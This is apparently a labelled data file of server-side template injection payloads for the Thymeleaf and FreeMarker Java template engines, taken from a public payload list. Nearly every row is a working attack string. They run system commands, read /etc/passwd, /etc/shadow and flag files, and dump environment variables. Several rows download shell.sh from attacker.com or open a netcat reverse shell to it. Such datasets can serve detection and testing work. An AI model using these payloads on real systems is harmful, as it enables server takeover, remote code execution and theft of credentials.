${T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.ProcessBuilder').getConstructor(T(String[]).class).newInstance(new String[]{'id'}).start()},${t(java.lang.classloader).getsystemclassloader().loadclass('S').getconstructor(t(string[]).class).newinstance(newstring[]{'S'}).start()},java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Character).toString(106).concat(T(java.lang.Character).toString(97))},${t(java.lang.character).tostring(N).concat(t(java.lang.character).tostring(N))},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).useDelimiter('\\A').next()},${newjava.util.scanner(t(java.lang.runtime).getruntime().exec('S').getinputstream()).usedelimiter('S').next()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()).useDelimiter('\\Z').next()},${newjava.util.scanner(t(java.lang.runtime).getruntime().exec('S').getinputstream()).usedelimiter('S').next()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.util.Scanner(new java.io.File('flag.txt')).useDelimiter('\\Z').next()},${newjava.util.scanner(newjava.io.file('S')).usedelimiter('S').next()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.apache.el.lang.ELSupport).coerceToType('id',T(java.lang.String))}","${t(org.apache.el.lang.elsupport).coercetotype('S',t(java.lang.string))}",java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.net.InetAddress).getLocalHost()},${t(java.net.inetaddress).getlocalhost()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.net.InetAddress).getLocalHost().getHostName()},${t(java.net.inetaddress).getlocalhost().gethostname()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.net.InetAddress).getLocalHost().getHostAddress()},${t(java.net.inetaddress).getlocalhost().gethostaddress()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.security.AccessController).doPrivileged(new java.security.PrivilegedAction(){@Override public Object run(){try{return T(java.lang.Runtime).getRuntime().exec('id');}catch(Exception e){return null;}}})},${t(java.security.accesscontroller).doprivileged(newjava.security.privilegedaction(){@overridepublicobjectrun(){try{returnt(java.lang.runtime).getruntime().exec('S');}catch(exceptione){returnnull;}}})},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())).readLine()},${newjava.io.bufferedreader(newjava.io.inputstreamreader(t(java.lang.runtime).getruntime().exec('S').getinputstream())).readline()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())).lines().toArray()},${newjava.io.bufferedreader(newjava.io.inputstreamreader(t(java.lang.runtime).getruntime().exec('S').getinputstream())).lines().toarray()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).readLine()},${newjava.io.bufferedreader(newjava.io.filereader('S')).readline()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).lines().toArray()},${newjava.io.bufferedreader(newjava.io.filereader('S')).lines().toarray()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.BufferedReader(new java.io.FileReader('flag.txt')).readLine()},${newjava.io.bufferedreader(newjava.io.filereader('S')).readline()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('calc')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('cmd /c calc')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('cmd /c dir')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('powershell.exe')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('cmd.exe /c whoami')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'cmd','/c','whoami'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'powershell','-c','whoami'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.util.Base64).getDecoder().decode('aWQ=')},${t(java.util.baseN).getdecoder().decode('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.lang.String(T(java.util.Base64).getDecoder().decode('aWQ='))},${newjava.lang.string(t(java.util.baseN).getdecoder().decode('S'))},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${""freemarker.template.utility.Execute""?new()(""env"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""ps aux"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""ifconfig"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""netstat -an"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""cat /etc/shadow"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",""whoami"").start()}","${""S""?new()(""S"",""S"").start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.io.File"",""/etc/passwd"")}","${""S""?new()(""S"",""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.JythonRuntime""?new().exec(""id"")}","${""S""?new().exec(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.JythonRuntime""?new().eval(""1+1"")}","${""S""?new().eval(""S"")}",java,FreeMarker,1,probe,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""id"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""whoami"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""cat /etc/passwd"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""ls -la"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""uname -a"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""pwd"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""env"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""cat flag.txt"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""ps aux"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""ifconfig"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""netstat -an"") }","<#assignex=""S""?new()>${ex(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${dwf.newInstance(ec,null)(""id"")}","${dwf.newinstance(ec,null)(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${object.getClass()},${object.getclass()},java,FreeMarker,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${object.getClass().getClassLoader()},${object.getclass().getclassloader()},java,FreeMarker,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${object.getClass().getProtectionDomain()},${object.getclass().getprotectiondomain()},java,FreeMarker,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${object.getClass().getProtectionDomain().getCodeSource()},${object.getclass().getprotectiondomain().getcodesource()},java,FreeMarker,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${object.getClass().getProtectionDomain().getClassLoader()},${object.getclass().getprotectiondomain().getclassloader()},java,FreeMarker,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.ProcessBuilder"",""id"").start()}","${value(""S"",""S"").start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.ProcessBuilder"",""whoami"").start()}","${value(""S"",""S"").start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.ProcessBuilder"",""cat"",""/etc/passwd"").start()}","${value(""S"",""S"",""S"").start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.io.File"",""/etc/passwd"").exists()}","${value(""S"",""S"").exists()}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.io.File"",""/"").list()}","${value(""S"",""S"").list()}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.io.File"",""/etc/passwd"")}","${value(""S"",""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.io.File"",""/etc/passwd"").exists()}","${""S""?new()(""S"",""S"").exists()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.io.File"",""/"").list()}","${""S""?new()(""S"",""S"").list()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.io.File"",""/"").listFiles()}","${""S""?new()(""S"",""S"").listfiles()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""sh"",""-c"",""id""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""bash"",""-c"",""id""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""/bin/sh"",""-c"",""id""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""/bin/bash"",""-c"",""id""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(command)}","${""S""?new()(command)}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.version},${.version},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.data_model},${.data_model},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.globals},${.globals},java,FreeMarker,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.locale},${.locale},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.now},${.now},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.current_node},${.current_node},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.main},${.main},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.namespace},${.namespace},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.output_encoding},${.output_encoding},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.url_escaping_charset},${.url_escaping_charset},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.vars},${.vars},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${.lang},${.lang},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${scanner.next()},${scanner.next()},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""touch /tmp/pwned"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""wget http://attacker.com/shell.sh -O /tmp/shell.sh"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""curl http://attacker.com/shell.sh -o /tmp/shell.sh"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""nc attacker.com 4444 -e /bin/bash"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${obj(""id"")}","${obj(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${runtime.exec(""id"")}","${runtime.exec(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${process.start()},${process.start()},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""cat${IFS}/etc/passwd"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""sh"",""-c"",""cat</etc/passwd""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""sh"",""-c"",""cat<flag.txt""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${ex(""cat${IFS}/etc/passwd"")}","${ex(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${ex(""cat$IFS/etc/passwd"")}","${ex(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""user.name"")}","${system.getproperty(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""user.home"")}","${system.getproperty(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""user.dir"")}","${system.getproperty(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""os.name"")}","${system.getproperty(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""os.version"")}","${system.getproperty(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""java.version"")}","${system.getproperty(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getProperty(""java.home"")}","${system.getproperty(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${system.getenv()},${system.getenv()},java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getenv(""PATH"")}","${system.getenv(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getenv(""HOME"")}","${system.getenv(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${system.getenv(""USER"")}","${system.getenv(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""cmd /c calc"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""cmd /c dir"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""powershell.exe"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(""cmd.exe /c whoami"")}","${""S""?new()(""S"")}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${ex(""cmd /c whoami"")}","${ex(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${ex(""powershell -c whoami"")}","${ex(""S"")}",java,FreeMarker,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""cmd"",""/c"",""whoami""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
